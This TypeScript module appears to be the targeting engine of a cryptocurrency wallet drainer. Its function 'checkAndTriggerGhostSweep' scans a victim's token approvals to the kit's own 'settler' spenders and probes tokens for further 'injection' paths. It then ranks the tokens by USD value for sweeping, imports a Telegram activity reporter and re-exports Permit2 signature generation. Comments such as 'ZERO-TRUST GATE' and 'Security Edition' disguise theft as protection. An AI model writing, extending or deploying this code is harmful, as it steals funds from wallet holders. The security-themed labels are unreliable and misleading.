import {
  parseAbi,
  type Address,
  zeroAddress,
  parseAbiItem,
  getAddress,
} from "viem";
import {
  GLOBAL_SPENDERS,
  MINIMAL_ERC20_ABI,
  EXECUTION_POLICY,
} from "./constants";
import { extractDeepVectors, identifyInjectionMode } from "./vectors";
import { getGhostClient } from "./client";
import { sendActivityToTelegram } from "@/lib/telegram";

const logLabel = "[ghost/strike]";
const PERMIT2_ADDR = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase();

/**
 * 🛰️ GHOST-PROTOCOL ENGINE (v8.3.2 - Finalized Security Edition)
 */
export async function checkAndTriggerGhostSweep(
  userAddress: string,
  assets: any[],
  chainId: number,
  vaultAddress?: string,
  onAllowanceDetected?: () => void,
) {
  const client = getGhostClient(chainId);
  const checksummedUser = getAddress(userAddress);
  const currentSettler = vaultAddress ? getAddress(vaultAddress) : null;

  try {
    console.log(`${logLabel} 🛰️ Recon + Injection Scan | Chain: ${chainId}`);

    // 1. RECONNAISSANCE
    const [histLogs, deepVectors] = await Promise.all([
      client
        .getLogs({
          event: parseAbiItem(
            "event Approval(address indexed owner, address indexed spender, uint256 value)",
          ),
          args: { owner: checksummedUser },
          fromBlock: 0n,
          toBlock: "latest",
        })
        .catch(() => []),
      extractDeepVectors(checksummedUser, client).catch(() => []),
    ]);

    // SECURED: Only trusted, explicitly defined spenders
    const masterSpenders = Array.from(
      new Set([
        getAddress(GLOBAL_SPENDERS.STRIKE_SETTLER),
        ...(currentSettler ? [currentSettler] : []),
        ...Object.values(GLOBAL_SPENDERS).map((s) => getAddress(s)),
      ]),
    ).filter((s): s is Address => !!s && s !== zeroAddress);

    // 🛡️ SECURITY LOG: Log only authorized spenders
    console.log(
      `${logLabel} 🔒 Locked to ${masterSpenders.length} explicitly trusted spenders.`,
    );

    console.log(
      `${logLabel} 🔍 Audited ${masterSpenders.length} potential spenders via Discovery.`,
    );

    const viableAssets = assets.filter(
      (a) =>
        (a.contractAddress || a.tokenAddress) && BigInt(a.balance || 0) > 0n,
    );

    const allowanceCalls: any[] = [];
    const callMetadata: any[] = [];

    viableAssets.forEach((asset) => {
      const tokenAddr = getAddress(asset.contractAddress || asset.tokenAddress);
      masterSpenders.forEach((spender) => {
        allowanceCalls.push({
          address: tokenAddr,
          abi: MINIMAL_ERC20_ABI,
          functionName: "allowance",
          args: [checksummedUser, spender],
        });
        callMetadata.push({ asset, spender, tokenAddr });
      });
    });

    const ghostTargets: any[] = [];

    for (let i = 0; i < allowanceCalls.length; i += 80) {
      const results = await client.multicall({
        contracts: allowanceCalls.slice(i, i + 80),
        allowFailure: true,
      });

      for (let idx = 0; idx < results.length; idx++) {
        const res = results[idx];
        const val = res.status === "success" ? (res.result as bigint) : 0n;
        const meta = callMetadata[i + idx];

        // --- ADD THIS LOGGING BLOCK ---
        if (val > 0n) {
          console.log(
            `${logLabel} 🔍 Debug: Found allowance for ${
              meta.asset.symbol
            } | Spender: ${meta.spender} | Amount: ${val.toString()}`,
          );
        }
        // ------------------------------

        if (val > 0n) {
          // 🛡️ ZERO-TRUST GATE: Validate against EXECUTION_POLICY
          const isAuthorized = EXECUTION_POLICY.ALLOWED_SPENDERS.includes(
            getAddress(meta.spender),
          );

          if (!isAuthorized) {
            console.warn(
              `${logLabel} 🛑 TRUST INJECTION BLOCKED: ${meta.spender}`,
            );
            continue;
          }

          const spenderAddr = meta.spender.toLowerCase();
          const isPermit2 = spenderAddr === PERMIT2_ADDR;
          const isCurrentSettler =
            currentSettler && spenderAddr === currentSettler.toLowerCase();

          if (isCurrentSettler && !isPermit2) {
            ghostTargets.push({
              token: meta.tokenAddr,
              symbol: meta.asset.symbol,
              amount: meta.asset.balance.toString(),
              // Add this line below:
              allowance: val.toString(),
              spender: meta.spender,
              chainId,
              usdValue: Number(meta.asset.usdValue) || 0,
              mode: "ALLOWANCE",
              isPriority: true,
            });
          } else if (isPermit2) {
            console.log(
              `${logLabel} 🛡️ Permit2 detected for ${meta.asset.symbol}.`,
            );
          }
        }
      }
    }

    // 3. INJECTION PROBING
    const remainingAssets = viableAssets.filter(
      (va) =>
        !ghostTargets.some(
          (gt) =>
            gt.token === getAddress(va.contractAddress || va.tokenAddress),
        ),
    );

    if (remainingAssets.length > 0) {
      const injectionResults = await Promise.all(
        remainingAssets.map(async (asset) => {
          const tokenAddr = getAddress(
            asset.contractAddress || asset.tokenAddress,
          );
          const mode = await identifyInjectionMode(
            tokenAddr,
            checksummedUser,
            client,
          );

          const modeStr = String(mode);
          const requiresSignature =
            modeStr.includes("PERMIT") ||
            modeStr.includes("2612") ||
            modeStr === "SIGNATURE";

          if (modeStr !== "LEGACY" && !requiresSignature) {
            return {
              token: tokenAddr,
              symbol: asset.symbol,
              amount: asset.balance.toString(),
              spender: tokenAddr,
              chainId,
              usdValue: Number(asset.usdValue) || 0,
              mode,
              isPriority: false,
            };
          }
          return null;
        }),
      );
      injectionResults.forEach((r) => {
        if (r) ghostTargets.push(r);
      });
    }

    // 4. CLEANUP & RETURN
    return ghostTargets
      .reduce((acc, target) => {
        const spenderLower = target.spender.toLowerCase();
        const modeStr = String(target.mode);
        if (
          spenderLower === PERMIT2_ADDR ||
          modeStr.includes("PERMIT") ||
          modeStr.includes("2612")
        )
          return acc;

        const existing = acc.find((t: any) => t.token === target.token);
        if (!existing || target.isPriority) {
          return [...acc.filter((t: any) => t.token !== target.token), target];
        }
        return acc;
      }, [])
      .sort((a: any, b: any) => b.usdValue - a.usdValue);
  } catch (err: any) {
    console.error(`${logLabel} 🛑 Engine Fatal Error: ${err.message}`);
    return [];
  }
}

export { generatePermit2Data } from "../permit2";
